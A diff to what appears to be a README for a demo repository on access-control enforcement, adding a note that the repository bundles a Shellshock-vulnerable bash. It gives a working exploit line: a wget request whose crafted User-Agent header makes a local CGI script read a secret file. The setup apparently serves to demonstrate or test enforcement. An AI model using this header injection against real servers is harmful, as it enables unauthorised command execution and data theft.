@@ -73,3 +73,9 @@ If you run:
 
 it will enable full enforcement and you will get audit logs and
 invalid accesses will be denied.
+
+This repository also contains an shellshock vulnerable version of
+bash.  To exploit it, on the host run:
+  wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /usr/share/super-secret/data" http://localhost:8080/cgi-bin/webif
+
+This is from https://security.stackexchange.com/questions/68122/what-is-a-specific-example-of-how-the-shellshock-bash-bug-could-be-exploited
